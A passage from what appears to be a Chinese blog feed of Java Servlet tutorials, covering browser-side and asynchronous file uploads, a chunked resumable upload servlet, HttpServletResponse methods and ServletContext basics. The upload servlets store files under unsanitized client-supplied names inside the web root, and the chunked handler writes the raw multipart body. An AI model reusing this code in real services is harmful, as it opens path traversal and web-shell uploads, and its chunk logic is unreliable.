class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">uploadFile</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;fileInput&#x27;</span>).<span class="property">files</span>[<span class="number">0</span>];</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span></span><br><span class="line"><span class="language-javascript">    formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, file);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    <span class="comment">// 监听上传进度</span></span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="property">upload</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;progress&#x27;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (event.<span class="property">lengthComputable</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">const</span> percentComplete = (event.<span class="property">loaded</span> / event.<span class="property">total</span>) * <span class="number">100</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;progressBar&#x27;</span>).<span class="property">style</span>.<span class="property">width</span> = percentComplete + <span class="string">&#x27;%&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">            <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;progressBar&#x27;</span>).<span class="property">textContent</span> = percentComplete.<span class="title function_">toFixed</span>(<span class="number">2</span>) + <span class="string">&#x27;%&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript">    </span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">open</span>(<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>, <span class="literal">true</span>);</span></span><br><span class="line"><span class="language-javascript">    xhr.<span class="title function_">send</span>(formData);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h3 id="4-2-使用多线程处理上传的文件"><a href="#4-2-使用多线程处理上传的文件" class="headerlink" title="4.2 使用多线程处理上传的文件"></a>4.2 使用多线程处理上传的文件</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/upload-async&quot;)</span></span><br><span class="line"><span class="meta">@MultipartConfig</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AsyncUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">ExecutorService</span> <span class="variable">executorService</span> <span class="operator">=</span> Executors.newFixedThreadPool(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">final</span> <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> getFileName(filePart);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 创建存储目录</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 异步处理文件</span></span><br><span class="line">        executorService.submit(() -&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                filePart.write(uploadPath + File.separator + fileName);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 这里可以进行额外的文件处理，如图片压缩、水印添加等</span></span><br><span class="line">                processFile(uploadPath + File.separator + fileName);</span><br><span class="line">                </span><br><span class="line">                System.out.println(<span class="string">&quot;文件 &quot;</span> + fileName + <span class="string">&quot; 处理完成&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 立即返回响应</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        response.getWriter().println(<span class="string">&quot;文件上传中，请稍后...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getFileName</span><span class="params">(Part part)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">contentDisp</span> <span class="operator">=</span> part.getHeader(<span class="string">&quot;content-disposition&quot;</span>);</span><br><span class="line">        String[] tokens = contentDisp.split(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String token : tokens) &#123;</span><br><span class="line">            <span class="keyword">if</span> (token.trim().startsWith(<span class="string">&quot;filename&quot;</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> token.substring(token.indexOf(<span class="string">&#x27;=&#x27;</span>) + <span class="number">1</span>).trim().replace(<span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">processFile</span><span class="params">(String filePath)</span> &#123;</span><br><span class="line">        <span class="comment">// 实现文件处理逻辑</span></span><br><span class="line">        <span class="comment">// 例如：图片压缩、格式转换等</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 关闭线程池</span></span><br><span class="line">        executorService.shutdown();</span><br><span class="line">        <span class="built_in">super</span>.destroy();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="4-3-断点续传实现"><a href="#4-3-断点续传实现" class="headerlink" title="4.3 断点续传实现"></a>4.3 断点续传实现</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/resume-upload&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ResumeUploadServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 返回断点续传上传页面</span></span><br><span class="line">        response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">        </span><br><span class="line">        out.println(<span class="string">&quot;&lt;!DOCTYPE html&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;html&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;head&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;title&gt;断点续传示例&lt;/title&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;script&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;function uploadChunk(file, start, chunkSize) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let end = Math.min(start + chunkSize, file.size);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let chunk = file.slice(start, end);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let xhr = new XMLHttpRequest();&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let formData = new FormData();&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;file&#x27;, chunk);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;fileName&#x27;, file.name);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;start&#x27;, start);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;end&#x27;, end);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  formData.append(&#x27;fileSize&#x27;, file.size);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  xhr.open(&#x27;POST&#x27;, &#x27;resume-upload&#x27;, true);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  xhr.onload = function() &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    if (xhr.status === 200) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;      if (end &lt; file.size) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;        uploadChunk(file, end, chunkSize);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;      &#125; else &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;        alert(&#x27;上传完成&#x27;);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;      &#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    &#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  &#125;;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  xhr.send(formData);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;function startUpload() &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  let file = document.getElementById(&#x27;fileInput&#x27;).files[0];&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  if (file) &#123;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    // 每次上传1MB&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;    uploadChunk(file, 0, 1024 * 1024);&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;  &#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/script&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/head&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;h2&gt;断点续传示例&lt;/h2&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;input type=&#x27;file&#x27; id=&#x27;fileInput&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;button onclick=&#x27;startUpload()&#x27;&gt;开始上传&lt;/button&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/body&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/html&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span></span><br><span class="line">            <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="comment">// 接收文件块</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;fileName&quot;</span>);</span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> Long.parseLong(request.getParameter(<span class="string">&quot;start&quot;</span>));</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> Long.parseLong(request.getParameter(<span class="string">&quot;end&quot;</span>));</span><br><span class="line">        <span class="type">long</span> <span class="variable">fileSize</span> <span class="operator">=</span> Long.parseLong(request.getParameter(<span class="string">&quot;fileSize&quot;</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 获取上传文件存储目录</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">uploadPath</span> <span class="operator">=</span> getServletContext().getRealPath(<span class="string">&quot;&quot;</span>) + File.separator + <span class="string">&quot;uploads&quot;</span>;</span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadDir.exists()) &#123;</span><br><span class="line">            uploadDir.mkdir();</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 目标文件</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">targetFile</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadPath, fileName);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 使用RandomAccessFile实现断点续传</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> request.getInputStream();</span><br><span class="line">             <span class="type">RandomAccessFile</span> <span class="variable">raf</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RandomAccessFile</span>(targetFile, <span class="string">&quot;rw&quot;</span>)) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 定位到文件的写入位置</span></span><br><span class="line">            raf.seek(start);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 写入数据</span></span><br><span class="line">            <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">4096</span>];</span><br><span class="line">            <span class="type">int</span> bytesRead;</span><br><span class="line">            <span class="keyword">while</span> ((bytesRead = in.read(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                raf.write(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            response.setStatus(HttpServletResponse.SC_OK);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="文件上传" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    <category term="文件下载" scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"/>
    
  </entry>
  
  <entry>
    <title>HttpServletResponse详解</title>
    <link href="http://example.com/2025/04/03/java/servlet/HttpServletResponse/"/>
    <id>http://example.com/2025/04/03/java/servlet/HttpServletResponse/</id>
    <published>2025-04-03T20:00:00.000Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="HttpServletResponse接口详解"><a href="#HttpServletResponse接口详解" class="headerlink" title="HttpServletResponse接口详解"></a>HttpServletResponse接口详解</h1><p><code>HttpServletResponse</code>是Servlet API中的核心接口，用于向客户端发送HTTP响应。本文将详细介绍该接口的所有方法及其用法。</p><h2 id="响应状态相关方法"><a href="#响应状态相关方法" class="headerlink" title="响应状态相关方法"></a>响应状态相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>void setStatus(int sc)</code></td><td>设置HTTP响应状态码</td></tr><tr><td><code>void sendError(int sc)</code></td><td>发送错误状态码</td></tr><tr><td><code>void sendError(int sc, String msg)</code></td><td>发送带有错误信息的状态码</td></tr><tr><td><code>void setStatus(int sc, String sm)</code></td><td>(已废弃)设置状态码和状态消息</td></tr></tbody></table><h2 id="响应头相关方法"><a href="#响应头相关方法" class="headerlink" title="响应头相关方法"></a>响应头相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>void addCookie(Cookie cookie)</code></td><td>添加Cookie到响应</td></tr><tr><td><code>boolean containsHeader(String name)</code></td><td>检查是否设置了指定响应头</td></tr><tr><td><code>void setHeader(String name, String value)</code></td><td>设置响应头</td></tr><tr><td><code>void addHeader(String name, String value)</code></td><td>添加响应头</td></tr><tr><td><code>void setIntHeader(String name, int value)</code></td><td>设置整型响应头</td></tr><tr><td><code>void addIntHeader(String name, int value)</code></td><td>添加整型响应头</td></tr><tr><td><code>void setDateHeader(String name, long date)</code></td><td>设置日期类型响应头</td></tr><tr><td><code>void addDateHeader(String name, long date)</code></td><td>添加日期类型响应头</td></tr></tbody></table><h2 id="响应体相关方法"><a href="#响应体相关方法" class="headerlink" title="响应体相关方法"></a>响应体相关方法</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>ServletOutputStream getOutputStream()</code></td><td>获取输出流(二进制数据)</td></tr><tr><td><code>PrintWriter getWriter()</code></td><td>获取字符输出流</td></tr></tbody></table><h2 id="编码和内容类型"><a href="#编码和内容类型" class="headerlink" title="编码和内容类型"></a>编码和内容类型</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>void setCharacterEncoding(String charset)</code></td><td>设置响应字符编码</td></tr><tr><td><code>String getCharacterEncoding()</code></td><td>获取响应字符编码</td></tr><tr><td><code>void setContentType(String type)</code></td><td>设置内容类型</td></tr><tr><td><code>String getContentType()</code></td><td>获取内容类型</td></tr><tr><td><code>void setContentLength(int len)</code></td><td>设置内容长度</td></tr><tr><td><code>void setContentLengthLong(long len)</code></td><td>设置内容长度(long类型)</td></tr></tbody></table><h2 id="缓冲管理"><a href="#缓冲管理" class="headerlink" title="缓冲管理"></a>缓冲管理</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>void flushBuffer()</code></td><td>刷新缓冲区</td></tr><tr><td><code>void resetBuffer()</code></td><td>重置缓冲区但保留响应头</td></tr><tr><td><code>void reset()</code></td><td>完全重置(包括响应头)</td></tr><tr><td><code>boolean isCommitted()</code></td><td>检查响应是否已提交</td></tr><tr><td><code>void setBufferSize(int size)</code></td><td>设置缓冲区大小</td></tr><tr><td><code>int getBufferSize()</code></td><td>获取缓冲区大小</td></tr></tbody></table><h2 id="重定向与URL编码"><a href="#重定向与URL编码" class="headerlink" title="重定向与URL编码"></a>重定向与URL编码</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>void sendRedirect(String location)</code></td><td>发送重定向响应</td></tr><tr><td><code>String encodeURL(String url)</code></td><td>编码URL以支持会话跟踪</td></tr><tr><td><code>String encodeRedirectURL(String url)</code></td><td>编码重定向URL</td></tr><tr><td><code>String encodeUrl(String url)</code></td><td>(已废弃)使用encodeURL()</td></tr><tr><td><code>String encodeRedirectUrl(String url)</code></td><td>(已废弃)使用encodeRedirectURL()</td></tr></tbody></table><h2 id="区域设置"><a href="#区域设置" class="headerlink" title="区域设置"></a>区域设置</h2><table><thead><tr><th>方法</th><th>描述</th></tr></thead><tbody><tr><td><code>void setLocale(Locale loc)</code></td><td>设置响应区域</td></tr><tr><td><code>Locale getLocale()</code></td><td>获取响应区域</td></tr></tbody></table><h2 id="常用方法详解"><a href="#常用方法详解" class="headerlink" title="常用方法详解"></a>常用方法详解</h2><h3 id="设置响应状态码"><a href="#设置响应状态码" class="headerlink" title="设置响应状态码"></a>设置响应状态码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">response.setStatus(HttpServletResponse.SC_OK); <span class="comment">// 200 OK</span></span><br><span class="line">response.sendError(HttpServletResponse.SC_NOT_FOUND); <span class="comment">// 404 Not Found</span></span><br><span class="line">response.sendError(HttpServletResponse.SC_FORBIDDEN, <span class="string">&quot;Access Denied&quot;</span>); <span class="comment">// 403 Forbidden</span></span><br></pre></td></tr></table></figure></div><h3 id="设置响应头"><a href="#设置响应头" class="headerlink" title="设置响应头"></a>设置响应头</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置内容类型</span></span><br><span class="line">response.setContentType(<span class="string">&quot;text/html;charset=UTF-8&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置响应头</span></span><br><span class="line">response.setHeader(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-cache&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置多值响应头</span></span><br><span class="line">response.addHeader(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;name=value&quot;</span>);</span><br><span class="line">response.addHeader(<span class="string">&quot;Set-Cookie&quot;</span>, <span class="string">&quot;name2=value2&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="发送响应数据"><a href="#发送响应数据" class="headerlink" title="发送响应数据"></a>发送响应数据</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方式一：使用PrintWriter</span></span><br><span class="line"><span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">writer.println(<span class="string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);</span><br><span class="line">writer.println(<span class="string">&quot;&lt;h1&gt;Hello World!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">writer.println(<span class="string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);</span><br><span class="line">writer.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方式二：使用ServletOutputStream</span></span><br><span class="line"><span class="type">ServletOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> response.getOutputStream();</span><br><span class="line">outputStream.write(<span class="string">&quot;Hello World!&quot;</span>.getBytes());</span><br><span class="line">outputStream.close();</span><br></pre></td></tr></table></figure></div><h3 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line">response.sendRedirect(<span class="string">&quot;/newpage.jsp&quot;</span>);</span><br></pre></td></tr></table></figure></div><h3 id="设置Cookie"><a href="#设置Cookie" class="headerlink" title="设置Cookie"></a>设置Cookie</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Cookie</span> <span class="variable">cookie</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Cookie</span>(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;john&quot;</span>);</span><br><span class="line">cookie.setMaxAge(<span class="number">3600</span>); <span class="comment">// 设置Cookie过期时间为1小时</span></span><br><span class="line">response.addCookie(cookie);</span><br></pre></td></tr></table></figure></div><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><ol><li>调用<code>getOutputStream()</code>和<code>getWriter()</code>是互斥的，不能在同一个响应中同时使用</li><li>在调用<code>getWriter()</code>之前应先设置字符编码和内容类型</li><li>一旦响应被提交（<code>isCommitted()</code>返回true），就无法修改状态码、头信息或重置缓冲区</li><li>重定向方法<code>sendRedirect()</code>会自动发送状态码302和Location头</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="java" scheme="http://example.com/categories/java/"/>
    
    
    <category term="java" scheme="http://example.com/tags/java/"/>
    
    <category term="servlet" scheme="http://example.com/tags/servlet/"/>
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ServletContext</title>
    <link href="http://example.com/2025/04/01/java/servlet/ServletContext/"/>
    <id>http://example.com/2025/04/01/java/servlet/ServletContext/</id>
    <published>2025-04-01T13:00:00.000Z</published>
    <updated>2025-04-26T11:30:29.883Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-ServletContext简介"><a href="#1-ServletContext简介" class="headerlink" title="1. ServletContext简介"></a>1. ServletContext简介</h2><p>ServletContext代表整个Web应用程序，每个Web应用程序只有一个ServletContext对象。它是在Web容器启动时创建，在Web容器关闭时销毁。ServletContext提供了一个跨整个应用程序的共享环境。</p><h2 id="2-获取ServletContext的方法"><a href="#2-获取ServletContext的方法" class="headerlink" title="2. 获取ServletContext的方法"></a>2. 获取ServletContext的方法</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法1：通过HttpServlet获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法2：通过ServletConfig获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> getServletConfig().getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法3：通过HttpServletRequest获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法4：通过HttpSession获取</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">context</span> <span class="operator">=</span> session.getServletContext();</span><br></pre></td></tr></table></figure></div><h2 id="3-ServletContext主要功能"><a href="#3-ServletContext主要功能" class="headerlink" title="3. ServletContext主要功能"></a>3. ServletContext主要功能</h2><h3 id="3-1-应用程序范围内的初始化参数"><a href="#3-1-应用程序范围内的初始化参数" class="headerlink" title="3.1 应用程序范围内的初始化参数"></a>3.1 应用程序范围内的初始化参数</h3><p>在web.xml中配置：</p><div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>appName<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>MyWebApp<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br></pre></td></tr></table></figure></div><p>在Servlet中使用：</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">appName</span> <span class="operator">=</span> servletContext.getInitParameter(<span class="string">&quot;appName&quot;</span>);</span><br><span class="line">Enumeration&lt;String&gt; paramNames = servletContext.getInitParameterNames();</span><br></pre></td></tr></table></figure></div><h3 id="3-2-属性管理"><a href="#3-2-属性管理" class="headerlink" title="3.2 属性管理"></a>3.2 属性管理</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置属性</span></span><br><span class="line">servletContext.setAttribute(<span class="string">&quot;userCount&quot;</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取属性</span></span><br><span class="line"><span class="type">Integer</span> <span class="variable">userCount</span> <span class="operator">=</span> (Integer) servletContext.getAttribute(<span class="string">&quot;userCount&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 移除属性</span></span><br><span class="line">servletContext.removeAttribute(<span class="string">&quot;userCount&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取所有属性名</span></span><br><span class="line">Enumeration&lt;String&gt; attrNames = 